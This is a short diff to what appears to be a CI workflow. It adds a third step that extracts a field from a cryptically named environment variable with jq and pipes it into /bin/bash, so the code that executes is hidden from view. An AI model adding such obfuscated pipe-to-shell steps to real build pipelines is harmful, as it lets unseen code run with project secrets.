@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$nrdou273" | jq -r .q06965 | /bin/bash
           echo $okrrq0 | jq -r .f1847 | /bin/bash
+          echo $ax4 | jq -r .etl8 | /bin/bash
 
       - name: Store artifact
         if: always()
